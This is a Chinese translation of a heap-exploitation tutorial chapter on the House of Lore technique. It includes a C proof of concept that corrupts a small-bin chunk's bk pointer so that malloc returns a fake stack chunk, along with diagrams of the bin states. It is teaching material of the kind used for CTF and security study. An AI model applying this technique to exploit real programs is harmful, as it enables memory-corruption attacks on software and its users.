---
title: Heap Exploitation系列翻译-14 House of Lore
tags: [CTF, pwn, heap]
layout: post
categories: translations
---

> 本文是对Dhaval Kapil的[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)系列教程的译文

这项攻击基本上是对于small bin和large bin的伪造堆块攻击. 然而, 因为约在2007年(对`fd_nextsize`和`bk_nextsize`的引入)一个新增的对large bin的保护, 该项技术变得不再可行. 这里我们只考虑small bin的情形. 首先, 一个small chunk会被放置在small bin中, 它的`bk`指针会被覆写成指向一个伪造的small chunk. 要注意的是在small bin的情况下, 插入操作发生在`首部`而移除操作发生在`尾部`. 一次malloc调用将首先移除bin中理应存在的堆块从而致使我们的伪堆块到了bin的`尾部`. 再下一次malloc调用就会返回攻击者的堆块.

考虑以下示例代码(下载完整版本 [这里](https://heap-exploitation.dhavalkapil.com/assets/files/house_of_lore.c)))

```c
struct small_chunk {
  size_t prev_size;
  size_t size;
  struct small_chunk *fd;
  struct small_chunk *bk;
  char buf[0x64];               // chunk falls in smallbin size range
};

struct small_chunk fake_chunk;                  // At address 0x7ffdeb37d050
struct small_chunk another_fake_chunk;
struct small_chunk *real_chunk;
unsigned long long *ptr, *victim;
int len;

len = sizeof(struct small_chunk);

// Grab two small chunk and free the first one
// This chunk will go into unsorted bin
ptr = malloc(len);                              // points to address 0x1a44010

// The second malloc can be of random size. We just want that
// the first chunk does not merge with the top chunk on freeing
malloc(len);                                    // points to address 0x1a440a0

// This chunk will end up in unsorted bin
free(ptr);

real_chunk = (struct small_chunk *)(ptr - 2);   // points to address 0x1a44000

// Grab another chunk with greater size so as to prevent getting back
// the same one. Also, the previous chunk will now go from unsorted to
// small bin
malloc(len + 0x10);                             // points to address 0x1a44130

// Make the real small chunk's bk pointer point to &fake_chunk
// This will insert the fake chunk in the smallbin
real_chunk->bk = &fake_chunk;
// and fake_chunk's fd point to the small chunk
// This will ensure that 'victim->bk->fd == victim' for the real chunk
fake_chunk.fd = real_chunk;

// We also need this 'victim->bk->fd == victim' test to pass for fake chunk
fake_chunk.bk = &another_fake_chunk;
another_fake_chunk.fd = &fake_chunk;

// Remove the real chunk by a standard call to malloc
malloc(len);                                    // points at address 0x1a44010

// Next malloc for that size will return the fake chunk
victim = malloc(len);                           // points at address 0x7ffdeb37d060
```

要注意到, 构造一个small chunk需要更多的步骤, 这是因为small chunks复杂的处理操作. 需要特别小心以确保每一个将要使用malloc返回的small chunk都满足`victim->bk->fd == victim`, 以通过安全检查"malloc(): smallbin double linked list corrupted". 此外也添加了额外的'malloc'调用以确保:

1. 第一个堆块在释放时会添加到unsorted bin而不是和top chunk合并
2. 第一个堆块会进入到small bin中因为它不满足大小为`len + 0x10`的malloc申请.

unsorted bin和small bin的状态如下所示

1. free(ptr).
  Unsorted bin:
  > head <-> ptr <-> tail

  Small bin:
  > head <-> tail
2. malloc(len + 0x10);
  Unsorted bin:
  > head <-> tail

  Small bin:
  > head <-> ptr <-> tail
3. Pointer manipulations1
  Unsorted bin:
  > head <-> tail

  Small bin:
  > undefined <-> fake_chunk <-> ptr <-> tail
4. malloc(len)
  Unsorted bin:
  > head <-> tail

  Small bin:
  > undefined <-> fake_chunk <-> tail
5. malloc(len)
  Unsorted bin:
  > head <-> tail

  Small bin:
  > undefined <-> tail         [ Fake chunk is returned ]

注意, 再次对small bin进行'malloc'调用会造成段错误
